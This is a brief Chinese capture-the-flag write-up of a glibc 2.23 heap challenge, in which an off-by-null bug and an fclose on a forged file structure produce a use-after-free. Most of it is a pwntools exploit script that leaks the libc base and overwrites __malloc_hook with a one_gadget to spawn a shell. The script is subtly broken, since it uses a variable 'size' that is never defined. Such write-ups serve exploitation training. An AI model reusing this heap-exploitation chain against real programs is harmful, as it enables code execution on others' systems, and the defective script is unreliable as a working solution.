记录一道有趣的题目，利用flose来实现free操作从而造成uaf。

glibc2.23

堆块在编辑的时候存在off-by-null

![2](.\2.png)



执行flose的函数，为了绕过验证让它能够再次free，flags位需要伪造。

![1](.\1.png)

exp：

```python
from pwn import*
context.log_level = 'debug'

p = process('./fog')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def pr(a,addr):
	log.success(a+'====>'+hex(addr))
def add(size,ct='a'):
	p.sendlineafter('choice?\n','1')
	p.sendlineafter('want?\n',str(size))
	p.sendafter(': \n',ct)
def delete(idx):
	p.sendlineafter('choice?\n','2')
	p.sendlineafter('delete?\n',str(idx))
def edit(idx,ct):
	p.sendlineafter('choice?\n','3')
	p.sendafter('?\n',str(idx))
	p.sendafter('?\n',ct)
def show(idx):
	p.sendlineafter('choice?\n','4')
	p.sendlineafter('?\n',str(idx))
def read_flag():
	p.sendlineafter('choice?\n','5')
def write_flag():
	p.sendlineafter('choice?\n','6')
read_flag()
write_flag()
p.sendlineafter('choice?\n','1')
p.sendlineafter('want?\n',str(size))
show(0)
p.recvuntil('Content : ')
libcbase = u64(p.recv(6)+'\x00\x00') - (0x7f8215a0ad98-0x7f8215646000)
malloc_hook = libcbase + libc.sym['__malloc_hook']
one = libcbase + 0x4527a
pr('libcbase',libcbase)
pr('malloc_hook',malloc_hook)
delete(0)
add(0x68,p64(0))
write_flag()
edit(0,p64(malloc_hook-0x23))
add(0x68)
add(0x68,'a'*0x13+p64(one))
p.sendlineafter('choice?\n','1')
p.sendline('16')
#gdb.attach(p)
p.interactive()
```

